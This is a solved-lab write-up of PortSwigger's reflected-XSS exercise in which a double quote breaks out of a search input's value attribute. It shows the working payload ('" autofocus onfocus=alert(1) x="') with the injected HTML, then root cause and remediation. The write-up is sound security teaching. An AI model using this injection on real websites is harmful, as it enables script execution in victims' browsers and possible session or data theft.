# LAB 07 -  Reflected XSS into attribute with angle brackets HTML-encoded

## Lab Information

- **Category:** Cross-Site Scripting (XSS)
- **Type:** Reflected XSS 
- **Difficulty:** Apprentice
- **Status:** ✅ Solved
- **Date:** 2026-8-22

---

![Cross-Site Scripting](https://img.shields.io/badge/Cross_Site_Scripting-XSS-red)

![Solved](https://img.shields.io/badge/Status-Solved-success)

---

# Table of Contents

- Executive Summary
- Lab Information
- Objective
- Vulnerability Overview
- Attack Prerequisites
- Environment & Scope
- Methodology
- Discovery Process
- Technical Analysis
- Payload Analysis
- Exploitation Flow
- Evidence
- Impact
- Root Cause
- Risk Assessment
- Remediation
- Lessons Learned
- References
- Screenshots

---

# Executive Summary

A Reflected XSS vulnerability was identified in this lab, involving angle bracket encoding.

Since the search input is located within the `input` attribute and the quotation mark is not encoded, we were able to close the `value` attribute and inject an `autofocus` event containing an `alert` function.

---

# Objective

The goal of this lab is to exploit a "Reflected" Cross-Site Scripting (XSS) vulnerability by closing the search input's `value` attribute and injecting an `autofocus` event that triggers an `alert`.

---

# Vulnerability Overview

A reflected Cross-Site Scripting (XSS) vulnerability occurs when user-controlled input is included in the HTML response without proper output encoding, allowing the browser to interpret the input as executable code.

---


# Attack Requirements

- User input is reflected in the HTTP response.
- The application does not properly encode quotation marks in the HTML attribute context.
- The reflected value is inserted into an HTML attribute.
- JavaScript event handlers are allowed to execute.
  
---

# Environment & Scope

| Item              | Value |
|-------------------|-------|
| Target            | PortSwigger Web Security Academy lab |
| HTTP Method       | GET |
| Injection Context | HTML Attribute Context |
| Client            | Web Browser |

---

# Methodology

1. Open the vulnerable lab.
2. Enter a normal search value to identify the reflection point.
3. Inspect the HTTP request and response using Burp Suite.
4. Identify the HTML attribute context.
5. Test whether quotation marks are encoded.
6. Escape the `value` attribute using a double quote.
7. Inject an event handler using `autofocus` and `onfocus`.
8. Verify JavaScript execution using `alert(1)`.

---

# Discovery Process

### Step 1 — Testing the search value

```text
mohamad
```

The search value "mohamad" is added within the tag "


### Step 2 — Testing Attribute Escape

```text
mohamad"
```
The double quote was reflected without being encoded, allowing the input to escape the original value attribute.

### Step 3 — Event addition test

```html
mohamad"autofocus onfocus=alert(1) x="
```
After closing the `value` attribute, we added an `alert` event inside it that executes when the page loads.

---

# Technical Analysis

The value of the search feature at the outset:

```html
<input type=text placeholder='Search the blog...' name=search value="mohamad">
```
The attacker-controlled input is reflected inside the value attribute.

### After Injection

```html
<input type=text placeholder='Search the blog...' name=search value="mohamad"autofocus onfocus=alert(1) x="">
```
The injected double quote closes the original value attribute. The attacker then adds the autofocus and onfocus attributes.
When the input automatically receives focus, the onfocus handler executes alert(1).

---

# Context Analysis

| Property | Value |
|---|---|
| Injection Context | HTML Attribute Context  |
| Encoding |  `<` and `>` HTML-encoded; quotation marks not encoded |
| Reflection Type | Reflected |
| URL Scheme Validation | None |
| Source | Search parameter |
| Payload Type | Attribute injection using autofocus and onfocus |

---

# Payload Analysis

## Payload Used

```text
mohamad" autofocus onfocus=alert(1) x="

```

## Why This Payload Works

```text
mohamad
```
A normal value used to identify the reflection point in the HTML response.


```html
"
```
The double quote closes the original value attribute: value="mohamad" This allows the attacker to break out of the original attribute context.

```html
autofocus 
```
The autofocus attribute causes the input element to receive focus automatically when the page loads.

```html
onfocus=alert(1)
```
The onfocus event handler executes when the input element receives focus.
Because autofocus causes the element to receive focus automatically, the browser executes: alert(1)

```html
x="
```
This adds another HTML attribute and completes the injected markup structure. It is not responsible for executing the JavaScript.

---

# Exploitation Flow

```text
"
│
├── Closes the original value attribute
│
▼
autofocus
│
├── Automatically gives the element focus
│
▼
onfocus=alert(1)
│
├── Executes when focus occurs
│
▼
JavaScript Execution
│
▼
alert(1)
  
```

---

# Evidence

## HTML Before Injection

```html
<input type=text placeholder='Search the blog...' name=search value="mohamad">
```

---

## HTML After Injection

 ```html
<input type=text placeholder='Search the blog...' name=search value="mohamad"autofocus onfocus=alert(1) x="">

 ```

After closing the `value` attribute, we added an `alert` event inside it that executes when the page loads.


## Result

```text
        "
        ↓
autofocus onfocus=alert(1) x="
        ↓
Event Execution
        ↓
The Appearance of the Message
```
---

# Impact

The demonstrated vulnerability allows arbitrary JavaScript execution in the victim's browser. Depending on the application's security controls and available browser-accessible data, this may allow:

- Manipulation of page content.
- Phishing attacks.
- Performing actions in the victim's security context.
- Access to sensitive data exposed to JavaScript.
- Session compromise in applications where session information is accessible to JavaScript.
 
---

# Root Cause

The root cause is improper context-aware output encoding. The application reflects user-controlled input inside an HTML attribute while failing to encode quotation marks.

Although angle brackets are HTML-encoded, the unencoded quotation mark allows an attacker to escape the `value` attribute and inject additional HTML attributes, including an event handler capable of executing JavaScript.

---

# Risk Assessment

| Item | Value |
|------|-------|
| Severity |  Context-dependent |
| CVSS Score | Not calculated |
| CWE | CWE-79: Improper Neutralization of Input During Web Page Generation |
| OWASP Category | Cross-Site Scripting (XSS) |
| Exploitability | Demonstrated in lab |
| Business Impact | Theft of customer accounts and sensitive data , Financial fraud and theft of funds , Reputational damage and loss of trust , Legal Fines and Penalties , Business disruption and incident response costs|

---

# Remediation

- **Context-aware Output Encoding**
  - Encode user-controlled data according to the HTML attribute context.

- **Safe Templating**
  - Use frameworks and templating engines that automatically perform context-aware escaping.

- **Input Validation**
  - Validate input according to the application's expected format.

- **Content Security Policy (CSP)**
  - Deploy a restrictive CSP as an additional defense-in-depth measure.

- **HttpOnly Cookies**
  - Mark sensitive session cookies as `HttpOnly` to reduce the ability of injected JavaScript to access them. This does not prevent XSS itself.
    
---

# Lessons Learned

- HTML encoding must be appropriate for the output context.
- Encoding `<` and `>` alone is not sufficient when quotation marks remain unencoded inside an HTML attribute.
- The injection context determines the appropriate XSS payload.
- Event handlers such as `onfocus` can execute JavaScript without requiring a `<script>` element.
- `autofocus` can be used to trigger a focus-dependent event automatically.
- Context-aware output encoding is essential for preventing XSS.
  
---

# References

- OWASP
- PortSwigger Web Security Academy
- MITRE CWE
- CVSS Specification

---

# Screenshots

## Initial Page

![Test](Screen-Shots/test-lab7.png)

...

## Payload Injection

![Injuction](Screen-Shots/injuct-lab7.png)

...

## Successful Alert

![Success](Screen-Shots/success-lab7.png)

---

# Conclusion

This practical experiment demonstrated the existence of a reflected XSS vulnerability, even when angle brackets (`<>`) are encoded; this is because JavaScript functions can be executed via event handlers within HTML attributes. Therefore, robust encoding is essential, and user input should never be trusted.

